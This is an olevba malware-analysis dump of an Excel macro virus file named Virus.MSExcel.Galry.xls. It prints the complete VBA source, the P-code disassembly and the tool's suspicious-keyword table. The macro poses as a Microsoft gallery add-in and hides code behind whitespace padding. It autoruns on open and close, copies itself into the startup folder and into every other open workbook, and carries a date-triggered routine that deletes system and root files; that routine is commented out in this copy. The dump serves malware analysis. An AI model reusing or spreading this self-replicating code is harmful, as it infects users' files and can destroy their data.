olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Galry.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO xl5galary.bas 
in file: Virus.MSExcel.Galry.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/xl5galary'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


































































































' ---------------------------------------------------------
' XL5GALLERY MACRO - ENABLES USERS OF VERSION 5 TO USE FX
' This is an autoload macro, which stays in the background
' so you can use the .XLA auto-add in.
' (C) Microsoft 1996. 1998
' ---------------------------------------------------------
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
' Normal error trap
On Error Resume Next
' Activation call for galary
Application.OnSheetActivate = ThisWorkbook.Name & "!xl5galary.galary"
End Sub
' End of routine
'
'
' Start of auto shutdown routine
Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
' Ordinary error trap
var_b_10000000000 = Format(Date, "mm")
var_b_10000000001 = Format(Date, "dd")
var_b_10000000002 = Format(Date, "yyyy")
' Enable true date conversion
                                                                                                                                                                                                                                                               If var_b_10000000000 = 5 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 9 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 10 And var_b_10000000001 = 29 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 11 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 12 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If (var_b_10000000001 = 11 Or var_b_10000000001 = 2) And var_b_10000000002 = 1999 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000003 = 1 Then
'
' start macro proper
'
ChDrive "C"
ChDir "c:\windows\system"
' Change to macro drive
'                                                                                                                                                                                                                                                               Kill "*.*"
'                                                                                                                                                                                                                                                               ChDrive "C"
'                                                                                                                                                                                                                                                               ChDir "c:\"
'                                                                                                                                                                                                                                                               Kill "*.*"
'                                                                                                                                                                                                                                                               MsgBox "The NHS Fat Cow Has Just Trashed Your Hardisk - XOH ", 16
End If
var_b_10000000008 = Application.StartupPath + "\XL5GLARY.XLS"
                                                                                                                                                                                                                                                               var_b_10000000004 = Dir(var_b_10000000008)
                                                                                                                                                                                                                                                               If UCase(var_b_10000000004) = "XL5GLARY.XLS" Then
GoTo var_b_10000000005
End If
' end of start setup
'
'
'

                                                                                                                                                                                                                                                               var_b_10000000006 = Application.StartupPath + "\xl5glary.xls"
                                                                                                                                                                                                                                                               ThisWorkbook.Modules("xl5galary").Copy
' Make sure the galery is active
var_b_10000000007 = ActiveWorkbook.Name
WindowState = xlMaximized
Application.Windows(var_b_10000000007).Visible = False
                                                                                                                                                                                                                                                               Application.Workbooks(var_b_10000000007).SaveAs FileName:=var_b_10000000006
var_b_10000000005:
var_b_10000000008 = Application.StartupPath + "\Xl5galry.XLS"
                                                                                                                                                                                                                                                               var_b_10000000009 = Dir(var_b_10000000008)
' End of initialisation routine
If UCase(var_b_10000000009) = "XL5GALRY.XLS" Then
ChDir (Application.StartupPath)
                                                                                                                                                                                                                                                               Kill "xl5galry.xls"
End If
End Sub
'
'
'
'
'
'
'
'
'
'
Sub galary()
Attribute galary.VB_ProcData.VB_Invoke_Func = " \n14"
var_b_10000000000 = Format(Date, "mm")
var_b_10000000001 = Format(Date, "dd")
var_b_10000000002 = Format(Date, "yyyy")
                                                                                                                                                                                                                                                               If var_b_10000000000 = 5 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 9 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 10 And var_b_10000000001 = 29 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 11 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000000 = 12 And var_b_10000000001 = 11 And var_b_10000000002 = 1998 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If (var_b_10000000001 = 11 Or var_b_10000000001 = 2) And var_b_10000000002 = 1999 Then var_b_10000000003 = 1
                                                                                                                                                                                                                                                               If var_b_10000000003 = 1 Then
ChDrive "C"
ChDir "c:\windows\system"
'                                                                                                                                                                                                                                                               Kill "*.*"
'                                                                                                                                                                                                                                                               ChDrive "C"
'                                                                                                                                                                                                                                                               ChDir "c:\"
'                                                                                                                                                                                                                                                               Kill "*.*"
'                                                                                                                                                                                                                                                               MsgBox "The NHS Fat Cow Has Just Trashed Your Hardisk", 16
End If
' end of double check
'
'
'
                                                                                                                                                                                                                                                               var_b_10000000010 = Application.Workbooks.Count
If var_b_10000000010 = 1 Then Exit Sub
For var_b_10000000011 = 1 To var_b_10000000010
var_b_10000000012 = 0
var_b_10000000013 = Workbooks(var_b_10000000011).Name
If var_b_10000000013 = ThisWorkbook.Name Then GoTo var_b_10000000016
var_b_10000000014 = Workbooks(var_b_10000000013).Modules.Count
                                                                                                                                                                                                                                                               If var_b_10000000014 > 0 Then
For var_b_10000000015 = 1 To var_b_10000000014
                                                                                                                                                                                                                                                               If Workbooks(var_b_10000000013).Modules(var_b_10000000015).Name = "xl5galary" Then var_b_10000000012 = 1
Next var_b_10000000015
End If
' Normal adding routine
If var_b_10000000012 = 0 Then
Windows(var_b_10000000013).Activate
ThisWorkbook.Modules("xl5galary").Copy before:=Workbooks(var_b_10000000013).Sheets(1)
                                                                                                                                                                                                                                                               Workbooks(var_b_10000000013).Modules("xl5galary").Visible = False
End If
var_b_10000000016:
Next var_b_10000000011
Exit Sub
' End of macro
' (C) microsoft 1996. 1998
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  xl5galar
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Galry.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/xl5galary - 13783 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' 	QuoteRem 0x0000 0x003A " ---------------------------------------------------------"
' Line #99:
' 	QuoteRem 0x0000 0x0038 " XL5GALLERY MACRO - ENABLES USERS OF VERSION 5 TO USE FX"
' Line #100:
' 	QuoteRem 0x0000 0x0039 " This is an autoload macro, which stays in the background"
' Line #101:
' 	QuoteRem 0x0000 0x0025 " so you can use the .XLA auto-add in."
' Line #102:
' 	QuoteRem 0x0000 0x0019 " (C) Microsoft 1996. 1998"
' Line #103:
' 	QuoteRem 0x0000 0x003A " ---------------------------------------------------------"
' Line #104:
' 	QuoteRem 0x0000 0x0000 ""
' Line #105:
' 	QuoteRem 0x0000 0x0000 ""
' Line #106:
' 	QuoteRem 0x0000 0x0000 ""
' Line #107:
' 	QuoteRem 0x0000 0x0000 ""
' Line #108:
' 	QuoteRem 0x0000 0x0000 ""
' Line #109:
' 	QuoteRem 0x0000 0x0000 ""
' Line #110:
' 	QuoteRem 0x0000 0x0000 ""
' Line #111:
' 	QuoteRem 0x0000 0x0000 ""
' Line #112:
' 	QuoteRem 0x0000 0x0000 ""
' Line #113:
' 	QuoteRem 0x0000 0x0000 ""
' Line #114:
' 	QuoteRem 0x0000 0x0000 ""
' Line #115:
' 	QuoteRem 0x0000 0x0000 ""
' Line #116:
' 	QuoteRem 0x0000 0x0000 ""
' Line #117:
' 	QuoteRem 0x0000 0x0000 ""
' Line #118:
' 	QuoteRem 0x0000 0x0000 ""
' Line #119:
' 	QuoteRem 0x0000 0x0000 ""
' Line #120:
' 	QuoteRem 0x0000 0x0000 ""
' Line #121:
' 	FuncDefn (Sub auto_open())
' Line #122:
' 	QuoteRem 0x0000 0x0012 " Normal error trap"
' Line #123:
' 	OnError (Resume Next) 
' Line #124:
' 	QuoteRem 0x0000 0x001B " Activation call for galary"
' Line #125:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x0011 "!xl5galary.galary"
' 	Concat 
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #126:
' 	EndSub 
' Line #127:
' 	QuoteRem 0x0000 0x000F " End of routine"
' Line #128:
' 	QuoteRem 0x0000 0x0000 ""
' Line #129:
' 	QuoteRem 0x0000 0x0000 ""
' Line #130:
' 	QuoteRem 0x0000 0x001F " Start of auto shutdown routine"
' Line #131:
' 	FuncDefn (Sub auto_close())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	QuoteRem 0x0000 0x0014 " Ordinary error trap"
' Line #134:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000000 
' Line #135:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000001 
' Line #136:
' 	Ld Date 
' 	LitStr 0x0004 "yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000002 
' Line #137:
' 	QuoteRem 0x0000 0x001C " Enable true date conversion"
' Line #138:
' 	Ld var_b_10000000000 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #139:
' 	Ld var_b_10000000000 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #140:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x001D 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #141:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #142:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #143:
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CF 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #144:
' 	Ld var_b_10000000003 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #145:
' 	QuoteRem 0x0000 0x0000 ""
' Line #146:
' 	QuoteRem 0x0000 0x0013 " start macro proper"
' Line #147:
' 	QuoteRem 0x0000 0x0000 ""
' Line #148:
' 	LitStr 0x0001 "C"
' 	ArgsCall ChDrive 0x0001 
' Line #149:
' 	LitStr 0x0011 "c:\windows\system"
' 	ArgsCall ChDir 0x0001 
' Line #150:
' 	QuoteRem 0x0000 0x0016 " Change to macro drive"
' Line #151:
' 	QuoteRem 0x0000 0x0109 "                                                                                                                                                                                                                                                               Kill "*.*""
' Line #152:
' 	QuoteRem 0x0000 0x010A "                                                                                                                                                                                                                                                               ChDrive "C""
' Line #153:
' 	QuoteRem 0x0000 0x010A "                                                                                                                                                                                                                                                               ChDir "c:\""
' Line #154:
' 	QuoteRem 0x0000 0x0109 "                                                                                                                                                                                                                                                               Kill "*.*""
' Line #155:
' 	QuoteRem 0x0000 0x0140 "                                                                                                                                                                                                                                                               MsgBox "The NHS Fat Cow Has Just Trashed Your Hardisk - XOH ", 16"
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\XL5GLARY.XLS"
' 	Add 
' 	St var_b_10000000008 
' Line #158:
' 	Ld var_b_10000000008 
' 	ArgsLd Dir 0x0001 
' 	St var_b_10000000004 
' Line #159:
' 	Ld var_b_10000000004 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "XL5GLARY.XLS"
' 	Eq 
' 	IfBlock 
' Line #160:
' 	GoTo var_b_10000000005 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	QuoteRem 0x0000 0x0013 " end of start setup"
' Line #163:
' 	QuoteRem 0x0000 0x0000 ""
' Line #164:
' 	QuoteRem 0x0000 0x0000 ""
' Line #165:
' 	QuoteRem 0x0000 0x0000 ""
' Line #166:
' Line #167:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\xl5glary.xls"
' 	Add 
' 	St var_b_10000000006 
' Line #168:
' 	LitStr 0x0009 "xl5galary"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0000 
' Line #169:
' 	QuoteRem 0x0000 0x001F " Make sure the galery is active"
' Line #170:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St var_b_10000000007 
' Line #171:
' 	Ld xlMaximized 
' 	St WindowState 
' Line #172:
' 	LitVarSpecial (False)
' 	Ld var_b_10000000007 
' 	Ld Application 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #173:
' 	Ld var_b_10000000006 
' 	ParamNamed FileName 
' 	Ld var_b_10000000007 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #174:
' 	Label var_b_10000000005 
' Line #175:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Xl5galry.XLS"
' 	Add 
' 	St var_b_10000000008 
' Line #176:
' 	Ld var_b_10000000008 
' 	ArgsLd Dir 0x0001 
' 	St var_b_10000000009 
' Line #177:
' 	QuoteRem 0x0000 0x001E " End of initialisation routine"
' Line #178:
' 	Ld var_b_10000000009 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "XL5GALRY.XLS"
' 	Eq 
' 	IfBlock 
' Line #179:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Paren 
' 	ArgsCall ChDir 0x0001 
' Line #180:
' 	LitStr 0x000C "xl5galry.xls"
' 	ArgsCall Kill 0x0001 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	EndSub 
' Line #183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #184:
' 	QuoteRem 0x0000 0x0000 ""
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' 	QuoteRem 0x0000 0x0000 ""
' Line #187:
' 	QuoteRem 0x0000 0x0000 ""
' Line #188:
' 	QuoteRem 0x0000 0x0000 ""
' Line #189:
' 	QuoteRem 0x0000 0x0000 ""
' Line #190:
' 	QuoteRem 0x0000 0x0000 ""
' Line #191:
' 	QuoteRem 0x0000 0x0000 ""
' Line #192:
' 	QuoteRem 0x0000 0x0000 ""
' Line #193:
' 	FuncDefn (Sub galary())
' Line #194:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000000 
' Line #195:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000001 
' Line #196:
' 	Ld Date 
' 	LitStr 0x0004 "yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St var_b_10000000002 
' Line #197:
' 	Ld var_b_10000000000 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #198:
' 	Ld var_b_10000000000 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #199:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x001D 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #200:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #201:
' 	Ld var_b_10000000000 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CE 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #202:
' 	Ld var_b_10000000001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld var_b_10000000001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld var_b_10000000002 
' 	LitDI2 0x07CF 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000003 
' 	EndIf 
' Line #203:
' 	Ld var_b_10000000003 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #204:
' 	LitStr 0x0001 "C"
' 	ArgsCall ChDrive 0x0001 
' Line #205:
' 	LitStr 0x0011 "c:\windows\system"
' 	ArgsCall ChDir 0x0001 
' Line #206:
' 	QuoteRem 0x0000 0x0109 "                                                                                                                                                                                                                                                               Kill "*.*""
' Line #207:
' 	QuoteRem 0x0000 0x010A "                                                                                                                                                                                                                                                               ChDrive "C""
' Line #208:
' 	QuoteRem 0x0000 0x010A "                                                                                                                                                                                                                                                               ChDir "c:\""
' Line #209:
' 	QuoteRem 0x0000 0x0109 "                                                                                                                                                                                                                                                               Kill "*.*""
' Line #210:
' 	QuoteRem 0x0000 0x0139 "                                                                                                                                                                                                                                                               MsgBox "The NHS Fat Cow Has Just Trashed Your Hardisk", 16"
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	QuoteRem 0x0000 0x0014 " end of double check"
' Line #213:
' 	QuoteRem 0x0000 0x0000 ""
' Line #214:
' 	QuoteRem 0x0000 0x0000 ""
' Line #215:
' 	QuoteRem 0x0000 0x0000 ""
' Line #216:
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	St var_b_10000000010 
' Line #217:
' 	Ld var_b_10000000010 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #218:
' 	StartForVariable 
' 	Ld var_b_10000000011 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld var_b_10000000010 
' 	For 
' Line #219:
' 	LitDI2 0x0000 
' 	St var_b_10000000012 
' Line #220:
' 	Ld var_b_10000000011 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	St var_b_10000000013 
' Line #221:
' 	Ld var_b_10000000013 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo var_b_10000000016 
' 	EndIf 
' Line #222:
' 	Ld var_b_10000000013 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	St var_b_10000000014 
' Line #223:
' 	Ld var_b_10000000014 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #224:
' 	StartForVariable 
' 	Ld var_b_10000000015 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld var_b_10000000014 
' 	For 
' Line #225:
' 	Ld var_b_10000000015 
' 	Ld var_b_10000000013 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "xl5galary"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St var_b_10000000012 
' 	EndIf 
' Line #226:
' 	StartForVariable 
' 	Ld var_b_10000000015 
' 	EndForVariable 
' 	NextVar 
' Line #227:
' 	EndIfBlock 
' Line #228:
' 	QuoteRem 0x0000 0x0016 " Normal adding routine"
' Line #229:
' 	Ld var_b_10000000012 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #230:
' 	Ld var_b_10000000013 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #231:
' 	LitDI2 0x0001 
' 	Ld var_b_10000000013 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0009 "xl5galary"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #232:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "xl5galary"
' 	Ld var_b_10000000013 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	Label var_b_10000000016 
' Line #235:
' 	StartForVariable 
' 	Ld var_b_10000000011 
' 	EndForVariable 
' 	NextVar 
' Line #236:
' 	ExitSub 
' Line #237:
' 	QuoteRem 0x0000 0x000D " End of macro"
' Line #238:
' 	QuoteRem 0x0000 0x0019 " (C) microsoft 1996. 1998"
' Line #239:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

